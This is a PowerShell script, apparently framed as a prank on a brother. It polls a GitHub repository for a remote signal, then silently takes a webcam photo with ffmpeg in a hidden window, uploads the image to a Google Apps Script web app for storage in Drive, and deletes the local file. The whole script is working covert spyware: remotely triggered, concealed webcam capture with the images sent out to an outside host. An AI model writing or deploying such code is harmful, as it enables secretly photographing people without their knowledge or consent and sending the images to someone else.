# blague_webcam_windows.ps1
# Surveille GitHub toutes les 3s.
# Quand take_photo=true -> prend une photo via ffmpeg -> envoie au Apps Script Web App -> stocke dans Drive.

$ConfigFile = Join-Path $PSScriptRoot "blague_config.json"
$FfmpegExe  = Join-Path $PSScriptRoot "ffmpeg.exe"
$config     = Get-Content $ConfigFile -Raw | ConvertFrom-Json

$headers = @{
    Authorization = "Bearer $($config.token)"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShell"
}

function Get-PhotoSignal {
    try {
        $url  = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_photo.json?ref=$($config.branch)"
        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($resp.content -replace "\s","")))
        $data = $json | ConvertFrom-Json
        return @{ take_photo = [bool]$data.take_photo; sha = $resp.sha }
    } catch { return $null }
}

function Reset-PhotoSignal($sha) {
    try {
        $body = @{
            message = "reset photo signal"
            content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"take_photo":false}'))
            sha     = $sha
            branch  = $config.branch
        } | ConvertTo-Json
        $url = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_photo.json"
        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

function Send-Photo {
    $filename = "frere_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').jpg"
    $tempPath = Join-Path $env:TEMP $filename

    # Capture via ffmpeg
    $proc = Start-Process -FilePath $FfmpegExe `
        -ArgumentList "-f dshow -i video=`"$($config.camera_name)`" -frames:v 1 -q:v 2 -y `"$tempPath`"" `
        -Wait -PassThru -WindowStyle Hidden

    if (-not (Test-Path $tempPath)) { return }

    # Envoi au Apps Script Web App -> Google Drive
    try {
        $bytes = [IO.File]::ReadAllBytes($tempPath)
        $b64   = [Convert]::ToBase64String($bytes)
        $body  = @{ image = $b64; filename = $filename } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $config.webapp_url -Method Post -Body $body -ContentType "application/json" | Out-Null
    } catch {}

    Remove-Item $tempPath -ErrorAction SilentlyContinue
}

# Boucle principale
while ($true) {
    $signal = Get-PhotoSignal
    if ($signal -and $signal.take_photo) {
        Reset-PhotoSignal $signal.sha
        Send-Photo
    }
    Start-Sleep -Seconds 3
}
